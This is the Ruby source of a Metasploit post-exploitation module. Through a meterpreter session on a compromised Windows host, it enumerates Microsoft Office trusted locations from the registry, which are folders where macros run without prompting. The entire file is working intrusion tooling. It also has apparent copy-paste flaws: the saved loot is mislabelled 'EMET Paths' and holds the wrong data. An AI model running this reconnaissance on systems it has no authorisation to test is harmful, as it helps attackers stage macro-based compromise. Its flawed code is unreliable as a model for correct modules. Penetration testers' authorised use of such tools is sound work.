##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Common

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Gather Microsoft Office Trusted Locations',
      'Description'   => %q( This module will enumerate the Microsoft Office trusted locations on the target host.),
      'License'       => MSF_LICENSE,
      'Author'        => [ 'vysec <vincent.yiu[at]mwrinfosecurity.com>' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def print_status(msg='')
    super("#{peer} - #{msg}")
  end

  def print_good(msg='')
    super("#{peer} - #{msg}")
  end

  def run
    reg_view = sysinfo['Architecture'] =~ /x64/ ? REGISTRY_VIEW_64_BIT : REGISTRY_VIEW_32_BIT
    reg_keys = registry_enumkeys('HKCU\\SOFTWARE\\Microsoft\\Office', reg_view)
    if reg_keys.nil?
      print_status('Failed to enumerate Office.')
    else
    	print_status('')
      print_status('Found Office:')
      #find version to use
      reg_keys.each do |path|
      	if not /[0-9][0-9].0/.match(path).nil?
      		val1 = path
      		print_status("Version found: #{val1}")
      		reg_keys2 = registry_enumkeys("HKCU\\SOFTWARE\\Microsoft\\Office\\#{val1}", reg_view)
		    if reg_keys2.nil?
		      print_status('Failed to enumerate applications.')
		    else
		      print_status('Found applications.')
		      #find version to use
		      reg_keys2.each do |path2|
		      	  val2 = path2
			      reg_keys3 = registry_enumkeys("HKCU\\SOFTWARE\\Microsoft\\Office\\#{val1}\\#{val2}\\Security\\Trusted Locations", reg_view)
			    if not reg_keys3.nil?
			      print_status('Found trusted locations.')

			      #find version to use
			      reg_keys3.each do |path3|
			      	  val3 = path3
				      #print_status(path3)
				      print_status('')
				      reg_vals = registry_getvaldata("HKCU\\SOFTWARE\\Microsoft\\Office\\#{val1}\\#{val2}\\Security\\Trusted Locations\\#{val3}", "Description", reg_view)
					    if not reg_vals.nil?
					          print_status("Description: #{reg_vals}")
						end
						reg_vals2 = registry_getvaldata("HKCU\\SOFTWARE\\Microsoft\\Office\\#{val1}\\#{val2}\\Security\\Trusted Locations\\#{val3}", "AllowSubFolders", reg_view)
					   
					  reg_vals = registry_getvaldata("HKCU\\SOFTWARE\\Microsoft\\Office\\#{val1}\\#{val2}\\Security\\Trusted Locations\\#{val3}", "Path", reg_view)
					    if not reg_vals.nil?
					    	if not reg_vals2.nil?
					          print_status("Path: #{reg_vals}, AllowSub: True")
					         else
					         	print_status("Path: #{reg_vals}, AllowSub: False")
					         end
						end
				  end
				end
			  end
			end
      	end
      end
      path = store_loot('host.emet_paths', 'text/plain', session, reg_keys.join("\r\n"), 'emet_paths.txt', 'EMET Paths')
      print_good("Results stored in: #{path}")
    end
  end
end
